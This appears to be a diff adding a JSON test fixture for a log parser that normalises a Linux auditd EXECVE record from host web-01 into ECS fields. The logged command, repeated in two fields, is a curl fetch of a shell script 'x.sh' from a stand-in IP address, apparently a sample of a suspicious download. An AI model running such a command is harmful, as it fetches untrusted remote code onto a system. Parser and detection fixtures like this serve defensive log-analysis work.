@@ -1,0 +1,20 @@
+{
+  "@timestamp": "2026-10-01T09:20:01.456000+00:00",
+  "ecs.version": "8.11.0",
+  "event.action": "execve",
+  "event.category": [
+    "process"
+  ],
+  "event.dataset": "logunify.linux_auditd",
+  "event.kind": "event",
+  "event.module": "auditd",
+  "event.original": "<13>Oct  1 12:00:01 web-01 audispd: node=web-01 type=EXECVE msg=audit(1790846401.456:4570): argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://203.0.113.9/x.sh\"",
+  "event.type": [
+    "start"
+  ],
+  "host.name": "web-01",
+  "labels.audit_serial": "4570",
+  "logunify.parser.name": "linux_auditd",
+  "logunify.source_format": "linux_auditd",
+  "message": "auditd EXECVE: argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://203.0.113.9/x.sh\""
+}
